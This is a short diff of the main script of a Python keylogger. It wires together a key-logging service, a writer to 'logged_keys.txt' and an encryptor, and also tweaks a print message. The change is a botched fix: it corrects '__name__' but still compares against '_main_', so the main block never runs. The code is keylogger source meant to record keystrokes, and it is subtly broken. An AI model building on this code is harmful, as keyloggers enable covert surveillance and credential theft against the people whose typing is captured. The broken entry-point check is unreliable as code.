@@ -5,7 +5,7 @@ from keyloggerManager import KeyLoggerManager
 import time
 
 
-if _name_ == "_main_":
+if __name__ == "_main_":
     keylogger = KeyLoggerService()
     writer = FileWriter("logged_keys.txt")
     encryptor = Encryptor(42)
@@ -20,4 +20,4 @@ if _name_ == "_main_":
     except KeyboardInterrupt:
         print("\nStopping Keylogger...")
         manager.stop()
-        print("✅ Keylogger stopped.")
+        print("Keylogger stopped.")
